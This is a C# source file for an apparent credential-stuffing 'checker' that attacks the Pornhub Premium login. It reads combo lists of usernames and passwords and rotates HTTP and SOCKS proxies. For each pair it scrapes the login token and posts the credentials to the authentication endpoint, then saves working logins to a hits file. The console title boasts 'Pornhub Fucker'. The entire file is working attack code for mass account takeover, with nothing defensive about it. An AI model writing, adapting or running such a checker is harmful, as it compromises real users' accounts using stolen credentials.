using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Drawing;


namespace checkertemplate
{
    class CheckerHelper
    {
        public static int total;

        public static int bad = 0;

        public static int hits = 0;

        public static int err = 0;

        public static int check = 0;

        public static int accindex = 0;

        public static List<string> proxies = new List<string>();

        public static string proxytype = "";

        public static int proxyindex = 0;

        public static int proxytotal = 0;

        public static int stop = 0;

        public static List<string> accounts = new List<string>();

        public static int CPM = 0;

        public static int CPM_aux = 0;

        public static int threads;

        public static void LoadCombos(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper.total++;
                        }
                    }
                }
            }
        }

        public static void LoadProxies(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper.proxytotal++;
                        }
                    }
                }
            }
        }

        public static void UpdateTitle()
        {
            for (; ; )
            {
                CheckerHelper.CPM = CheckerHelper.CPM_aux;
                CheckerHelper.CPM_aux = 0;
                Colorful.Console.Title = string.Format("Pornhub Fucker | Checked: {0}/{1} | Hits: {2} | Bad: {3} | Errors: {4} | CPM: ", new object[]
                {
                        CheckerHelper.check,
                        CheckerHelper.total,
                        CheckerHelper.hits,
                        CheckerHelper.bad,
                        CheckerHelper.err
                }) + CheckerHelper.CPM * 60 + " | Made By UmRange";
                Thread.Sleep(1000);
            }
        }

        public static void Check()
        {
            for (; ; )
            {
                if (CheckerHelper.proxyindex > CheckerHelper.proxies.Count<string>() - 2)
                {
                    CheckerHelper.proxyindex = 0;
                }
                try
                {
                    Interlocked.Increment(ref CheckerHelper.proxyindex);
                    using (HttpRequest req = new HttpRequest())
                    {
                        if (CheckerHelper.accindex >= CheckerHelper.accounts.Count<string>())
                        {
                            CheckerHelper.stop++;
                            break;
                        }
                        Interlocked.Increment(ref CheckerHelper.accindex);
                        string[] array = CheckerHelper.accounts[CheckerHelper.accindex].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        });
                        string text = array[0] + ":" + array[1];
                        try
                        {
                            if (CheckerHelper.proxytype == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper.proxytype == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper.proxytype == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper.proxytype == "NO")
                            {
                                req.Proxy = null;
                            }
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
                            req.KeepAlive = true;
                            req.IgnoreProtocolErrors = true;
                            req.ConnectTimeout = 5000;
                            req.Cookies = null;
                            req.UseCookies = true;
                            string get = req.Get("https://www.pornhubpremium.com/premium/login", null).ToString();
                            string token = CheckerHelper.Parse(get, "name=\"token\" value=\"", "\"");
                            string str2 = "username=" + array[0] + "&password=" + array[1] + "&token=" + token + "&redirect=&from=pc_premium_login&segment=straight";
                            string str3 = req.Post("https://www.pornhubpremium.com/front/authenticate", str2, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                            if (str3.Contains(":\"1\",\"remember"))
                            {
                                CheckerHelper.CPM_aux++;
                                CheckerHelper.check++;
                                CheckerHelper.hits++;
                                Colorful.Console.WriteLine("[GOOD] " + text, Color.DarkGreen);
                                CheckerHelper.SaveData(text);
                            }
                            else if (str3.Contains("Invalid username"))
                            {
                                CheckerHelper.CPM_aux++;
                                CheckerHelper.check++;
                                CheckerHelper.bad++;
                                Colorful.Console.WriteLine("[BAD] " + text, Color.DarkRed);
                            }
                            else
                            {
                                CheckerHelper.accounts.Add(text);
                            }

                        }
                        catch (Exception)
                        {
                            CheckerHelper.accounts.Add(text);
                        }
                    }
                    continue;
                }
                catch
                {
                    Interlocked.Increment(ref CheckerHelper.err);
                }
            }
        }

        public static void SaveData(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("hits.txt"))
                {
                    sw.WriteLine("--------------------| Login information |------------------------");
                    sw.WriteLine("- Account Login Information: " + account);
                    sw.WriteLine("-----------------------------------------------------------------");
                    sw.WriteLine();
                }
            }
            catch
            {

            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}